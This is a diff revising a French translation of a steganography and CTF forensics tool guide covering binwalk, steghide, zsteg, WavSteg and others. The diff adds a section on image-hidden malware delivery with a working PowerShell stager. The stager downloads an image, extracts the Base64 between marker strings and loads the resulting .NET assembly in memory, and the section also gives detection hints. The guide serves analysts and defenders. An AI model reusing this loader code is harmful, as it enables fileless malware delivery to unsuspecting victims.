@@ -6,7 +6,7 @@
 
 ### **Binwalk**
 
-Un outil pour rechercher des fichiers binaires à la recherche de fichiers et de données cachés intégrés. Il s'installe via `apt` et sa source est disponible sur [GitHub](https://github.com/ReFirmLabs/binwalk).
+Un outil pour rechercher dans des fichiers binaires des fichiers intégrés cachés et des données. Il s'installe via `apt` et son code source est disponible sur [GitHub](https://github.com/ReFirmLabs/binwalk).
 ```bash
 binwalk file # Displays the embedded data
 binwalk -e file # Extracts the data
@@ -14,29 +14,29 @@ binwalk --dd ".*" file # Extracts all data
 ```
 ### **Foremost**
 
-Récupère des fichiers en fonction de leurs en-têtes et pieds de page, utile pour les images png. Installé via `apt` avec sa source sur [GitHub](https://github.com/korczis/foremost).
+Récupère des fichiers en se basant sur leurs en-têtes et leurs pieds, utile pour les images png. Installé via `apt` et dont le code source est disponible sur [GitHub](https://github.com/korczis/foremost).
 ```bash
 foremost -i file # Extracts data
 ```
 ### **Exiftool**
 
-Aide à visualiser les métadonnées des fichiers, disponible [here](https://www.sno.phy.queensu.ca/~phil/exiftool/).
+Aide à visualiser les métadonnées des fichiers, disponible [ici](https://www.sno.phy.queensu.ca/~phil/exiftool/).
 ```bash
 exiftool file # Shows the metadata
 ```
 ### **Exiv2**
 
-Semblable à exiftool, pour la visualisation des métadonnées. Installable via `apt`, source sur [GitHub](https://github.com/Exiv2/exiv2), et a un [site officiel](http://www.exiv2.org/).
+Similaire à exiftool, pour la visualisation des métadonnées. Installable via `apt`, source sur [GitHub](https://github.com/Exiv2/exiv2), et dispose d'un [official website](http://www.exiv2.org/).
 ```bash
 exiv2 file # Shows the metadata
 ```
-### **Fichier**
+### **File**
 
-Identifiez le type de fichier avec lequel vous traitez.
+Identifiez le type de fichier dont il s'agit.
 
-### **Chaînes**
+### **Strings**
 
-Extrait des chaînes lisibles des fichiers, en utilisant divers paramètres d'encodage pour filtrer la sortie.
+Extrait des chaînes lisibles de fichiers, en utilisant différents paramètres d'encodage pour filtrer la sortie.
 ```bash
 strings -n 6 file # Extracts strings with a minimum length of 6
 strings -n 6 file | head -n 20 # First 20 strings
@@ -48,7 +48,7 @@ strings -e b -n 6 file # 16bit strings (big-endian)
 strings -e L -n 6 file # 32bit strings (little-endian)
 strings -e B -n 6 file # 32bit strings (big-endian)
 ```
-### **Comparison (cmp)**
+### **Comparaison (cmp)**
 
 Utile pour comparer un fichier modifié avec sa version originale trouvée en ligne.
 ```bash
@@ -58,74 +58,74 @@ cmp original.jpg stego.jpg -b -l
 
 ### **Données cachées dans les espaces**
 
-Des caractères invisibles dans des espaces apparemment vides peuvent cacher des informations. Pour extraire ces données, visitez [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).
+Les caractères invisibles dans des espaces apparemment vides peuvent dissimuler des informations. Pour extraire ces données, visitez [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).
 
 ## **Extraction de données à partir d'images**
 
-### **Identification des détails d'image avec GraphicMagick**
+### **Identifier les détails d'image avec GraphicMagick**
 
-[GraphicMagick](https://imagemagick.org/script/download.php) sert à déterminer les types de fichiers image et à identifier une éventuelle corruption. Exécutez la commande ci-dessous pour inspecter une image :
+[GraphicMagick](https://imagemagick.org/script/download.php) sert à déterminer les types de fichiers image et à identifier une corruption potentielle. Exécutez la commande ci‑dessous pour inspecter une image:
 ```bash
 ./magick identify -verbose stego.jpg
 ```
-Pour tenter de réparer une image endommagée, ajouter un commentaire dans les métadonnées pourrait aider :
+Pour tenter de réparer une image endommagée, ajouter un commentaire de métadonnées peut aider :
 ```bash
 ./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
 ```
 ### **Steghide pour la dissimulation de données**
 
-Steghide facilite la dissimulation de données dans des fichiers `JPEG, BMP, WAV et AU`, capable d'incorporer et d'extraire des données chiffrées. L'installation est simple en utilisant `apt`, et son [code source est disponible sur GitHub](https://github.com/StefanoDeVuono/steghide).
+Steghide facilite la dissimulation de données dans des fichiers `JPEG, BMP, WAV, and AU`, et permet d'insérer et d'extraire des données chiffrées. L'installation est simple via `apt`, et son [source code is available on GitHub](https://github.com/StefanoDeVuono/steghide).
 
-**Commandes :**
+**Commandes:**
 
 - `steghide info file` révèle si un fichier contient des données cachées.
-- `steghide extract -sf file [--passphrase password]` extrait les données cachées, le mot de passe étant optionnel.
+- `steghide extract -sf file [--passphrase password]` extrait les données cachées, mot de passe optionnel.
 
-Pour l'extraction basée sur le web, visitez [ce site web](https://futureboy.us/stegano/decinput.html).
+Pour une extraction via le web, visitez [this website](https://futureboy.us/stegano/decinput.html).
 
-**Attaque par bruteforce avec Stegcracker :**
+**Attaque par force brute avec Stegcracker:**
 
-- Pour tenter de craquer le mot de passe sur Steghide, utilisez [stegcracker](https://github.com/Paradoxis/StegCracker.git) comme suit :
+- Pour tenter de craquer le mot de passe de Steghide, utilisez [stegcracker](https://github.com/Paradoxis/StegCracker.git) comme suit:
 ```bash
 stegcracker <file> [<wordlist>]
 ```
-### **zsteg pour les fichiers PNG et BMP**
+### **zsteg for PNG and BMP Files**
 
-zsteg se spécialise dans la découverte de données cachées dans les fichiers PNG et BMP. L'installation se fait via `gem install zsteg`, avec sa [source sur GitHub](https://github.com/zed-0xff/zsteg).
+zsteg est spécialisé dans la découverte de données cachées dans les fichiers PNG et BMP. L'installation se fait via `gem install zsteg`, et le projet est disponible sur [source on GitHub](https://github.com/zed-0xff/zsteg).
 
 **Commandes :**
 
 - `zsteg -a file` applique toutes les méthodes de détection sur un fichier.
-- `zsteg -E file` spécifie une charge utile pour l'extraction de données.
+- `zsteg -E file` spécifie un payload pour l'extraction des données.
 
-### **StegoVeritas et Stegsolve**
+### **StegoVeritas and Stegsolve**
 
-**stegoVeritas** vérifie les métadonnées, effectue des transformations d'image et applique le brute forcing LSB parmi d'autres fonctionnalités. Utilisez `stegoveritas.py -h` pour une liste complète des options et `stegoveritas.py stego.jpg` pour exécuter tous les contrôles.
+**stegoVeritas** vérifie les métadonnées, effectue des transformations d'image et applique du LSB brute forcing, entre autres fonctionnalités. Utilisez `stegoveritas.py -h` pour la liste complète des options et `stegoveritas.py stego.jpg` pour exécuter toutes les vérifications.
 
 **Stegsolve** applique divers filtres de couleur pour révéler des textes ou messages cachés dans les images. Il est disponible sur [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve).
 
-### **FFT pour la détection de contenu caché**
+### **FFT for Hidden Content Detection**
 
-Les techniques de Transformée de Fourier Rapide (FFT) peuvent révéler du contenu dissimulé dans les images. Les ressources utiles incluent :
+Les techniques de Fast Fourier Transform (FFT) peuvent dévoiler du contenu dissimulé dans les images. Ressources utiles :
 
 - [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
 - [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
-- [FFTStegPic sur GitHub](https://github.com/0xcomposure/FFTStegPic)
+- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)
 
-### **Stegpy pour les fichiers audio et image**
+### **Stegpy for Audio and Image Files**
 
-Stegpy permet d'incorporer des informations dans des fichiers image et audio, prenant en charge des formats comme PNG, BMP, GIF, WebP et WAV. Il est disponible sur [GitHub](https://github.com/dhsdshdhk/stegpy).
+Stegpy permet d'insérer des informations dans des fichiers image et audio, en prenant en charge des formats comme PNG, BMP, GIF, WebP et WAV. Il est disponible sur [GitHub](https://github.com/dhsdshdhk/stegpy).
 
-### **Pngcheck pour l'analyse des fichiers PNG**
+### **Pngcheck for PNG File Analysis**
 
-Pour analyser les fichiers PNG ou valider leur authenticité, utilisez :
+Pour analyser des fichiers PNG ou valider leur authenticité, utilisez :
 ```bash
 apt-get install pngcheck
 pngcheck stego.png
 ```
 ### **Outils supplémentaires pour l'analyse d'images**
 
-Pour une exploration plus approfondie, envisagez de visiter :
+Pour approfondir, consultez :
 
 - [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
 - [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
@@ -133,27 +133,57 @@ Pour une exploration plus approfondie, envisagez de visiter :
 - [OpenStego](https://www.openstego.com/)
 - [DIIT](https://diit.sourceforge.net/)
 
-## **Extraction de données à partir d'audios**
+## Base64 payloads délimités par marqueurs cachés dans des images (malware delivery)
 
-**La stéganographie audio** offre une méthode unique pour dissimuler des informations dans des fichiers sonores. Différents outils sont utilisés pour intégrer ou récupérer du contenu caché.
+Les commodity loaders cachent de plus en plus des payloads encodés en Base64 en texte clair à l'intérieur d'images par ailleurs valides (souvent GIF/PNG). Plutôt qu'au niveau des pixels (LSB), le payload est délimité par des chaînes marqueurs uniques de début/fin incorporées dans le texte/la métadonnée du fichier. Un stager PowerShell procède ensuite :
+
+- Télécharge l'image via HTTP(S)
+- Localise les chaînes marqueurs (exemples observés : <<sudo_png>> … <<sudo_odt>>)
+- Extrait le texte intermédiaire et le décode Base64 en octets
+- Charge l'assembly .NET en mémoire et invoque une méthode d'entrée connue (aucun fichier écrit sur le disque)
+
+Extrait PowerShell minimal pour le carving/chargement
+```powershell
+$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
+$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
+$s = $img.IndexOf($start); $e = $img.IndexOf($end)
+if($s -ge 0 -and $e -gt $s){
+$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
+$bytes = [Convert]::FromBase64String($b64)
+[Reflection.Assembly]::Load($bytes) | Out-Null
+}
+```
+Remarques
+- This falls under ATT&CK T1027.003 (steganography). Les chaînes de marquage varient selon les campagnes.
+- Hunting: scannez les images téléchargées à la recherche de délimiteurs connus ; signalez `PowerShell` utilisant `DownloadString` suivi de `FromBase64String`.
+
+See also phishing delivery examples and full in-memory invocation flow here:
+
+{{#ref}}
+../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
+{{#endref}}
+
+## **Extraction de données des fichiers audio**
+
+**Audio steganography** offre une méthode unique pour dissimuler des informations dans des fichiers audio. Différents outils sont utilisés pour intégrer ou extraire du contenu caché.
 
 ### **Steghide (JPEG, BMP, WAV, AU)**
 
-Steghide est un outil polyvalent conçu pour cacher des données dans des fichiers JPEG, BMP, WAV et AU. Des instructions détaillées sont fournies dans la [documentation des astuces de stéganographie](stego-tricks.md#steghide).
+Steghide est un outil polyvalent conçu pour cacher des données dans des fichiers JPEG, BMP, WAV et AU. Des instructions détaillées sont fournies dans la [stego tricks documentation](stego-tricks.md#steghide).
 
 ### **Stegpy (PNG, BMP, GIF, WebP, WAV)**
 
-Cet outil est compatible avec une variété de formats, y compris PNG, BMP, GIF, WebP et WAV. Pour plus d'informations, référez-vous à [la section de Stegpy](stego-tricks.md#stegpy-png-bmp-gif-webp-wav).
+Cet outil est compatible avec divers formats, notamment PNG, BMP, GIF, WebP et WAV. Pour plus d'informations, consultez la [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav).
 
 ### **ffmpeg**
 
-ffmpeg est crucial pour évaluer l'intégrité des fichiers audio, mettant en évidence des informations détaillées et identifiant toute anomalie.
+ffmpeg est essentiel pour évaluer l'intégrité des fichiers audio, afficher des informations détaillées et identifier d'éventuelles anomalies.
 ```bash
 ffmpeg -v info -i stego.mp3 -f null -
 ```
 ### **WavSteg (WAV)**
 
-WavSteg excelle à dissimuler et extraire des données dans des fichiers WAV en utilisant la stratégie du bit de poids faible. Il est accessible sur [GitHub](https://github.com/ragibson/Steganography#WavSteg). Les commandes incluent :
+WavSteg excelle à dissimuler et à extraire des données dans des fichiers WAV en utilisant la technique least significant bit. Il est disponible sur [GitHub](https://github.com/ragibson/Steganography#WavSteg). Les commandes incluent :
 ```bash
 python3 WavSteg.py -r -b 1 -s soundfile -o outputfile
 
@@ -161,28 +191,28 @@ python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
 ```
 ### **Deepsound**
 
-Deepsound permet le chiffrement et la détection d'informations dans des fichiers audio en utilisant AES-256. Il peut être téléchargé depuis [la page officielle](http://jpinsoft.net/deepsound/download.aspx).
+Deepsound permet le chiffrement et la détection d'informations dans des fichiers audio en utilisant AES-256. Il peut être téléchargé depuis [the official page](http://jpinsoft.net/deepsound/download.aspx).
 
 ### **Sonic Visualizer**
 
-Un outil inestimable pour l'inspection visuelle et analytique des fichiers audio, Sonic Visualizer peut révéler des éléments cachés indétectables par d'autres moyens. Visitez le [site officiel](https://www.sonicvisualiser.org/) pour en savoir plus.
+Outil précieux pour l'inspection visuelle et analytique des fichiers audio, Sonic Visualizer peut révéler des éléments cachés indétectables par d'autres moyens. Visitez le [official website](https://www.sonicvisualiser.org/) pour en savoir plus.
 
 ### **DTMF Tones - Dial Tones**
 
-La détection des tons DTMF dans des fichiers audio peut être réalisée grâce à des outils en ligne tels que [ce détecteur DTMF](https://unframework.github.io/dtmf-detect/) et [DialABC](http://dialabc.com/sound/detect/index.html).
+La détection des tonalités DTMF dans des fichiers audio peut être réalisée à l'aide d'outils en ligne tels que [this DTMF detector](https://unframework.github.io/dtmf-detect/) et [DialABC](http://dialabc.com/sound/detect/index.html).
 
-## **Other Techniques**
+## **Autres techniques**
 
 ### **Binary Length SQRT - QR Code**
 
-Les données binaires qui se carrent pour donner un nombre entier pourraient représenter un code QR. Utilisez ce snippet pour vérifier :
+Des données binaires dont la racine carrée de la longueur est un entier peuvent représenter un QR code. Utilisez ce snippet pour vérifier :
 ```python
 import math
 math.sqrt(2500) #50
 ```
-Pour la conversion binaire en image, consultez [dcode](https://www.dcode.fr/binary-image). Pour lire les codes QR, utilisez [ce lecteur de codes-barres en ligne](https://online-barcode-reader.inliteresearch.com/).
+Pour convertir du binaire en image, consultez [dcode](https://www.dcode.fr/binary-image). Pour lire les QR codes, utilisez [this online barcode reader](https://online-barcode-reader.inliteresearch.com/).
 
-### **Traduction en Braille**
+### **Traduction du Braille**
 
 Pour traduire le Braille, le [Branah Braille Translator](https://www.branah.com/braille-translator) est une excellente ressource.
 
@@ -190,5 +220,7 @@ Pour traduire le Braille, le [Branah Braille Translator](https://www.branah.com/
 
 - [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
 - [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
+- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
+- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
 
 {{#include ../banners/hacktricks-training.md}}
